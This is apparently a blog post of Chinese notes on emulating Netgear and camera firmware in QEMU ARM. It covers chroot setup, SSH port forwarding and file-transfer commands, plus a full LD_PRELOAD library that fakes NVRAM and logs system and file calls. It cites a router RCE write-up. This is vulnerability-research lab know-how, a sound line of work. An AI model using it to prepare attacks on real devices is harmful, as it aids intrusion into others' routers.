<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Ubuntu</span></span><br><span class="line"><span class="comment"># 1 拷贝至虚拟机、cd qemu_arm</span></span><br><span class="line"><span class="comment"># 2 创建虚拟网卡tap0，分配IP</span></span><br><span class="line">sudo tunctl -t tap0 -u `whoami`</span><br><span class="line">sudo ifconfig tap0 10.10.10.1/24</span><br><span class="line"><span class="comment"># 3 启动</span></span><br><span class="line">./run.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># qemu_arm</span></span><br><span class="line"><span class="comment"># 4 登录，root-root</span></span><br><span class="line">debian-armhf login: root</span><br><span class="line">Password:</span><br><span class="line"><span class="comment"># 5 配置网卡IP、检测连通性</span></span><br><span class="line">ifconfig eth0 10.10.10.2/24</span><br><span class="line">ping 10.10.10.1</span><br><span class="line"><span class="comment"># 6 拷贝文件系统至qemu_arm</span></span><br><span class="line">scp+tar、wget+pyhttpd</span><br><span class="line"><span class="comment"># 7 挂载（先拷文件系统！）</span></span><br><span class="line">mount -t proc /proc ./squashfs-root/proc</span><br><span class="line">mount -o <span class="built_in">bind</span> /dev ./squashfs-root/dev</span><br><span class="line"><span class="comment"># 8 chroot并启动sh</span></span><br><span class="line">chroot ./squashfs-root/ sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意：忘记mount后，命令执行会出问题，如ps</span></span><br><span class="line"><span class="comment"># 若虚拟机重启，有可能需要重新mount和ifconfig</span></span><br></pre></td></tr></table></figure>
<h1 id="02-qemu-user"><a href="#02-qemu-user" class="headerlink" title="02-qemu-user"></a>02-qemu-user</h1><ul>
<li><a href="https://www.anquanke.com/post/id/217606" target="_blank" rel="noopener">https://www.anquanke.com/post/id/217606</a></li>
</ul>
<h1 id="03-armx"><a href="#03-armx" class="headerlink" title="03-armx"></a>03-armx</h1><h1 id="04-其它"><a href="#04-其它" class="headerlink" title="04-其它"></a>04-其它</h1><h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><ul>
<li>本地端口转发</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1 mac、ssh（源、目的、中间</span></span><br><span class="line">ssh -L 9000:192.168.100.2:80 root@192.168.142.182</span><br><span class="line">http://127.0.0.1:9000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 Windows、xshell</span></span><br><span class="line"><span class="comment"># https://blog.csdn.net/qq_34039315/article/details/77510923</span></span><br><span class="line"><span class="comment"># 右键属性、隧道、添加、类型是本地（拔出）</span></span><br><span class="line"><span class="comment"># 通过此中间主机，将目标转到源</span></span><br><span class="line">源主机：localhost</span><br><span class="line">侦听端口：9000</span><br><span class="line">目标主机：192.168.100.2</span><br><span class="line">目标端口：80</span><br><span class="line"></span><br><span class="line"><span class="comment"># udp端口不能通过ssh来转发，因为其基于tcp，要用其它工具</span></span><br></pre></td></tr></table></figure>
<h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1 tar + scp</span></span><br><span class="line">tar -zcvf 1.tar.gz squashfs-root/</span><br><span class="line">scp 1.tar.gz root@10.10.10.2:/root</span><br><span class="line">tar -zxvf 1.tar.gz</span><br><span class="line"><span class="comment"># 2 pyhttpd + wget</span></span><br><span class="line">python3 -m http.server</span><br><span class="line">python2 -m SimpleHTTPServer</span><br><span class="line">wget http://10.10.10.1:8000/1.tar.gz</span><br><span class="line"><span class="comment"># 3 tftp + win7服务端</span></span><br><span class="line">./busybox-armv4tl tftp -p -l funjsq_log_level 192.168.1.3</span><br><span class="line"><span class="comment"># 4 mount + nfs</span></span><br><span class="line">- mac服务端：sudo vim /etc/exports：/Users/lxl/Public/4share -alldirs -network 192.168.55.0 -mask 255.255.255.0（默认就是rw权限，如果只读，则-ro）、nfsd status/<span class="built_in">enable</span>/start</span><br><span class="line">- 摄像头客户端：mount -t nfs 192.168.55.153:/Users/lxl/Public/nfs_share /home -o nolock</span><br><span class="line">- 客户端向外传文件：touch: 111: Permission denied（没权限，cp命令也如此），直接把nfs服务端的目录权限设为777</span><br><span class="line"><span class="comment"># 5</span></span><br></pre></td></tr></table></figure>
<h2 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h2><ul>
<li>ps看是否有telnetd或sshd</li>
<li>原生busybox支持命令少，可自行上传，如<code>/tmp/busybox-armv7l netstat -atp</code></li>
</ul>
<h1 id="05-修复运行依赖"><a href="#05-修复运行依赖" class="headerlink" title="05-修复运行依赖"></a>05-修复运行依赖</h1><h2 id="LD-PRELOAD劫持符号链接"><a href="#LD-PRELOAD劫持符号链接" class="headerlink" title="LD_PRELOAD劫持符号链接"></a>LD_PRELOAD劫持符号链接</h2><ul>
<li>custom_nvram</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 源码 https://github.com/therealsaumil/custom_nvram、https://raw.githubusercontent.com/therealsaumil/custom_nvram/master/custom_nvram_r6250.c</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* custom_nvram.c</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Emulates the Netgear 6250/6400's nvram functions</span></span><br><span class="line"><span class="comment"> * by reading key=value pairs from /tmp/nvram.ini</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * by Saumil Shah</span></span><br><span class="line"><span class="comment"> * @therealsaumil</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ./buildroot-2016.11.2/output/host/usr/bin/arm-buildroot-linux-uclibcgnueabi-gcc -shared -fPIC -o nvram.so nvram.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NVRAM_FILE      <span class="meta-string">"/tmp/nvram.ini"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NVRAM_ENTRIES   2000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NVRAM_KEYLEN    128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NVRAM_LINE      256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> counter = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> nvram_init = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> nvram_entries = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// inefficient and crude key value pair array</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> key[NVRAM_ENTRIES][NVRAM_KEYLEN];</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> value[NVRAM_ENTRIES][NVRAM_KEYLEN];</span><br><span class="line"></span><br><span class="line"><span class="comment">// function declarations</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">custom_nvram_init</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_nvram</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(*real_system)</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *command)</span> </span>= <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">static</span> FILE *(*real_fopen)(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *mode) = <span class="literal">NULL</span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(*real_open)</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> flags)</span> </span>= <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// function will be called only once when any of the acosNvram_* functions get</span></span><br><span class="line"><span class="comment">// invoked</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">custom_nvram_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   nvram_init = <span class="number">1</span>;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"custom_nvram initialised\n"</span>);</span><br><span class="line">   nvram_entries = read_nvram();</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Read %d entries from %s\n"</span>, nvram_entries, NVRAM_FILE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// function to read the nvram.ini file into</span></span><br><span class="line"><span class="comment">// a global array</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_nvram</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">   FILE *fp;</span><br><span class="line">   <span class="keyword">char</span> line[NVRAM_LINE], *k, *v;</span><br><span class="line"></span><br><span class="line">   fp = fopen(NVRAM_FILE, <span class="string">"r"</span>);</span><br><span class="line">   <span class="keyword">if</span>(fp == (FILE *) <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Cannot open %s\n"</span>, NVRAM_FILE);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">while</span>(!feof(fp)) &#123;</span><br><span class="line">      fgets(line, NVRAM_LINE, fp);</span><br><span class="line">      k = strtok(line, <span class="string">"="</span>);</span><br><span class="line">      v = strtok(<span class="literal">NULL</span>, <span class="string">"\n"</span>);</span><br><span class="line">      <span class="built_in">memset</span>(key[i], <span class="string">'\0'</span>, NVRAM_KEYLEN);</span><br><span class="line">      <span class="built_in">memset</span>(value[i], <span class="string">'\0'</span>, NVRAM_KEYLEN);</span><br><span class="line">      <span class="keyword">if</span>(k != <span class="literal">NULL</span>)</span><br><span class="line">         <span class="built_in">strncpy</span>(key[i], k, NVRAM_KEYLEN - <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span>(v != <span class="literal">NULL</span>)</span><br><span class="line">         <span class="built_in">strncpy</span>(value[i], v, NVRAM_KEYLEN - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"[nvram %d] %s = %s\n"</span>, i, key[i], value[i]);</span><br><span class="line">      i++;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(i &gt;= NVRAM_ENTRIES) &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"** WARNING: nvram entries exceeds %d\n"</span>, NVRAM_ENTRIES);</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   fclose(fp);</span><br><span class="line">   <span class="keyword">return</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">nvram_get</span><span class="params">(<span class="keyword">char</span> *k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">char</span> *v = <span class="string">""</span>;</span><br><span class="line">   <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; nvram_entries; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strcmp</span>(key[i], k) == <span class="number">0</span>) &#123;</span><br><span class="line">         <span class="comment">//v = strdup(value[i]);</span></span><br><span class="line">         v = value[i];</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span>(v);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">nvram_set</span><span class="params">(<span class="keyword">char</span> *k, <span class="keyword">char</span> *v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; nvram_entries; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strcmp</span>(key[i], k) == <span class="number">0</span>) &#123;</span><br><span class="line">         <span class="built_in">strncpy</span>(value[i], v, NVRAM_KEYLEN - <span class="number">1</span>);</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// hook system()</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">system</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *command)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> r;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   real_system = dlsym(RTLD_NEXT, <span class="string">"system"</span>);</span><br><span class="line">   r = real_system(command);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"system('%s') = %d\n"</span>, command, r);</span><br><span class="line">   <span class="keyword">return</span>(r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// hook fopen()</span></span><br><span class="line"><span class="function">FILE *<span class="title">fopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   FILE *fp;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   real_fopen = dlsym(RTLD_NEXT, <span class="string">"fopen"</span>);</span><br><span class="line">   fp = real_fopen(filename, mode);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"fopen('%s', '%s') = 0x%08x\n"</span>, filename, mode, (<span class="keyword">unsigned</span> <span class="keyword">int</span>) fp);</span><br><span class="line">   <span class="keyword">return</span>(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// hook open()</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> r;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   real_open = dlsym(RTLD_NEXT, <span class="string">"open"</span>);</span><br><span class="line">   r = real_open(pathname, flags);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"open('%s', %d) = %d\n"</span>, pathname, flags, r);</span><br><span class="line">   <span class="keyword">return</span>(r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* intercepted libnvram.so functions */</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">acosNvramConfig_get</span><span class="params">(<span class="keyword">char</span> *k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">char</span> *v = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(!nvram_init)</span><br><span class="line">      custom_nvram_init();</span><br><span class="line"></span><br><span class="line">   v = nvram_get(k);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"acosNvramConfig_get('%s') = '%s'\n"</span>, k, v);</span><br><span class="line">   <span class="keyword">return</span>(v);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">acosNvramConfig_set</span><span class="params">(<span class="keyword">char</span> *k, <span class="keyword">char</span> *v)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(!nvram_init)</span><br><span class="line">      custom_nvram_init();</span><br><span class="line"></span><br><span class="line">   i = nvram_set(k, v);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[nvram %d] acosNvramConfig_set('%s', '%s')\n"</span>, i, k, v);</span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">acosNvramConfig_read</span><span class="params">(<span class="keyword">char</span> *k, <span class="keyword">char</span> *r, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">char</span>* v = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(!nvram_init)</span><br><span class="line">      custom_nvram_init();</span><br><span class="line"></span><br><span class="line">   v = nvram_get(k);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">strncpy</span>(r, v, len);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"acosNvramConfig_read('%s', '%s', %d)\n"</span>, k, r, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">acosNvramConfig_match</span><span class="params">(<span class="keyword">char</span> *k, <span class="keyword">char</span> *v)</span> </span>&#123;</span><br><span class="line">   <span class="comment">// return 0 (False) by default</span></span><br><span class="line">   <span class="keyword">int</span> r = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">char</span> *s;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(!nvram_init)</span><br><span class="line">      custom_nvram_init();</span><br><span class="line"></span><br><span class="line">   s = nvram_get(k);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="built_in">strcmp</span>(s, v) == <span class="number">0</span>)</span><br><span class="line">      r = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"acosNvramConfig_match('%s', '%s') = %d\n"</span>, k, v, r);</span><br><span class="line">   <span class="keyword">return</span>(r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* intercepted other libacos_shared.so functions */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">agApi_fwServiceAdd</span><span class="params">(<span class="keyword">char</span> *k, <span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   counter++;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"agApi_fwServiceAdd('%s', %d, %d, %d) = %d\n"</span>, k, a, b, c, counter);</span><br><span class="line">   <span class="keyword">return</span>(counter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">agApi_fwURLFilterEnableTmSch_Session2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"agApi_fwURLFilterEnableTmSch_Session2(%d) = 0\n"</span>, x);</span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">agApi_fwURLFilterEnable_Session2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"agApi_fwURLFilterEnable_Session2(%d) = 0\n"</span>, x);</span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">agApi_tmschDelConf</span><span class="params">(<span class="keyword">char</span> *k)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"agApi_tmschDelConf('%s') = 0\n"</span>, k);</span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">agApi_tmschAddConf</span><span class="params">(<span class="keyword">char</span> *a, <span class="keyword">char</span> *b, <span class="keyword">char</span> *c, <span class="keyword">char</span> *d, <span class="keyword">char</span> *e, <span class="keyword">int</span> f, <span class="keyword">int</span> g, <span class="keyword">int</span> h)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"agApi_tmschAddConf('%s', '%s', '%s', '%s', '%s', %d, %d, %d)\n"</span>, a, b, c, d, e, f, g, h);</span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">agApi_tmschDelConf_Session2</span><span class="params">(<span class="keyword">char</span> *k)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"agApi_tmschDelConf_Session2('%s') = 0\n"</span>, k);</span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">agApi_tmschAddConf_Session2</span><span class="params">(<span class="keyword">char</span> *a, <span class="keyword">char</span> *b, <span class="keyword">char</span> *c, <span class="keyword">char</span> *d, <span class="keyword">char</span> *e, <span class="keyword">int</span> f, <span class="keyword">int</span> g, <span class="keyword">int</span> h)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"agApi_tmschAddConf_Session2('%s', '%s', '%s', '%s', '%s', %d, %d, %d)\n"</span>, a, b, c, d, e, f, g, h);</span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">agApi_fwBlkServModAction</span><span class="params">(<span class="keyword">char</span> *k)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"agApi_fwBlkServModAction('%s') = 0\n"</span>, k);</span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">agApi_fwBlkServModAction_Session2</span><span class="params">(<span class="keyword">char</span> *k)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"agApi_fwBlkServModAction('%s') = 0\n"</span>, k);</span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">agApi_fwEchoRespSet</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"agApi_fwEchoRespSet(%d) = 1\n"</span>, x);</span><br><span class="line">   <span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">agApi_fwURLFilterEnable</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"agApi_fwURLFilterEnable(%d) = 0\n"</span>, x);</span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">agApi_fwURLFilterEnableTmSch</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"agApi_fwURLFilterEnableTmSch() = 0\n"</span>);</span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">agApi_fwGetAllServices</span><span class="params">(<span class="keyword">char</span> *k, <span class="keyword">int</span> a)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"agApi_fwGetAllServices('%s', %d) = %d\n"</span>, k, a, counter);</span><br><span class="line">   <span class="keyword">return</span>(counter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">agApi_fwDelTriggerConf2</span><span class="params">(<span class="keyword">char</span> *k)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"agApi_fwDelTriggerConf2('%s')\n"</span>, k);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">agApi_fwGetNextTriggerConf</span><span class="params">(<span class="keyword">int</span> a)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"agApi_fwGetNextTriggerConf(0x%08x) = 1\n"</span>, a);</span><br><span class="line">   <span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// compile</span></span><br><span class="line">armv5l-gcc -Wall -fPIC -shared custom_nvram_r6250.c -o nvram.so</span><br><span class="line"><span class="comment">//usage，用LD_PRELOAD，比如</span></span><br><span class="line">LD_PRELOAD=<span class="string">"/custom_nvram_r6250.so /lib/libdl.so.0"</span> /usr/sbin/upnpd</span><br><span class="line"><span class="comment">// 参考</span></span><br><span class="line">Netgear Nighthawk R8300 upnpd PreAuth RCE 分析与复现：https:<span class="comment">//paper.seebug.org/1311/</span></span><br></pre></td></tr></table></figure>
<h2 id="文章链接"><a href="#文章链接" class="headerlink" title="文章链接"></a>文章链接</h2><ul>
<li><p>Netgear Nighthawk R8300 upnpd PreAuth RCE 分析与复现：<a href="https://paper.seebug.org/1311/" target="_blank" rel="noopener">https://paper.seebug.org/1311/</a> </p>
